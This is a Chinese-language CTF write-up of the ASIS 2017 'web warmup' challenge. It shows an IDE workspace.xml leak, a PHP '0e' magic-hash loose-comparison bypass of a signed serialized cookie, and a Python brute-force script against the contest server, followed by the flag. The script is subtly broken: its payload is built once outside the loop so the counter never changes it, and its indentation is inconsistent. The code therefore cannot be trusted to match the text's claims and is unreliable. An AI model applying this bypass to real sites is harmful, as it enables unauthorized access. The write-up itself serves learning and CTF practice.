# ASISctf2017 'web warmup' writeup

这道题根据题目提示，作者在服务器上使用了 ide 编写代码。查看网页源文件发现作者使用的是 phpstorm，网上寻找 phpstorm 源代码泄露的文章，知道 phpstorm 的 project 文件夹下有一个.idea文件夹，这个文件夹里面有一个 workspace.xml 泄露了这个 project 的详细信息。

```xml
<component name="IdeDocumentHistory">
<option name="changedFiles">
<list>
<option value="$PROJECT_DIR$/backup/panel.class.php.bk"/>
</list>
</option>
</component>
```

其中在 changedFiles 中找到了这个文件，审计源码

```php
$realSign = md5($payload.$this->__sessionKey);

            /**
             * making it impossible to login, if the site is under maintenance,
             */
            if(__MAINTENANCE__===true)
                $realSign = substr($realSign, 0, 6);

            /**
             * checking signature, prevent to data forgery by user
             */
            if($realSign == $signature){	//弱类型比较
                $this->data = unserialize($payload);
```

发现有个弱类型比较，一开始爆破的姿势错误，去爆破 signature 的值，一直爆破不出来而且网络状况也不太好。后来才知道__sessionKey 无法获取，但是__sessionKey是一直不变的，所以可以爆破 payload，来让 realSign 等于0e1234这样的字符串，signature 也等于0e11111111...111这样的字符串，这两个字符串会被转化成数字类型，也就是0，比较的话就是相等的了。爆破的概率还是蛮高的

1/16 * 1/16 * (10/16) ** 4

最后7000多次的时候成功了。然后成功 login，panel.class.php 里面有 index 函数、flag 函数、downloadSource 等函数，猜测 url 是index?auth的情况下调用的是 index 函数，那么把 url 改成flag?auth=就调用了 flag 函数了获取 flag。

爆破脚本

```python
#!/usr/bin/env python
#coding=utf-8

from pwn import *
import requests
import base64

# loginString = base64.b64encode(username + ':' + password) 
# r = s.get('http://46.101.96.182/authentication/login/'+loginString)
# print r.text

print "----------------------"
print "request auth"
print "----------------------"

i = -1
hash_str = '0e' + 30 * '1'
serialized_pd = 'a:2:{s:6:"logged";b:1;s:4:"flag";i:%d;}' % i
payload = base64.b64encode(serialized_pd)
params = { 'auth': payload + hash_str }
while True:
    i = i + 1
	try:
    	r = requests.get('http://46.101.96.182/panel/flag', params = params, timeout = 10)
    	r.raise_for_status()
    	print r.url
    	print r.content
    	if 'login required' in r.text:
        	sys.exit(0)
    	with open("final_result.html", "w") as f:
        	print "write to file"
        	f.write(r.content)
        	print "write to file success"
	except Exception as e:
    	print "Exception!", e
f.close()

```



flag:** ASIS{An0th3R_Tiny_Obj3c7_Inject1oN_L0L!!!}



把 url 改成 downloadSource?auth=… 下载了 source.zip，但是下载下来没法解压缩，binwalk 查看发现这个文件包含了 html header，剩下的是很多段的 zip compressed data， 用 dd 去除 html header 之后，用 unzip 还是报错，用 tar xvf 也报错，然后手滑输入了 jar xvf 竟然解压缩成功了！明明 file 和 binwalk 都显示是 zip 文件的说。然后尝试了一下用 jar 打包一个文件，然后用 file 查看文件类型，显示是Java archive data (JAR)。总感觉有点神奇。。。

